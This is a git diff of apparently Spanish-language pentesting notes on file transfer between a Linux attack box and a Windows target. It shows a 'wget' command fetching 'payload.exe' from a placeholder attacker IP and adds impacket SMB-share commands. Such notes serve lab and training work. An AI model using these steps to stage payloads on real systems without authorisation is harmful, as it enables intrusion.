@@ -54,3 +54,14 @@ C:\Windows\Temp
 
 1. ❯ wget http://IP/payload.exe         # Para descargar el payload de la maquina Linux
 ```
+
+## Compartir archivos en un SMB de Linux a Windows 
+```bash
+❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un servicio con SMB 
+
+	# smbFolder = Nos creara un servicio compartido llamado 'smbFolder'
+	# pwd = Sincronizado con la ruta absoluta actual 
+	# smb2support = En Windows 10 le damos soporte a la version 2
+
+❯ smbserver.py <FOLDERNAME> $(pwd)                 # Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
+```
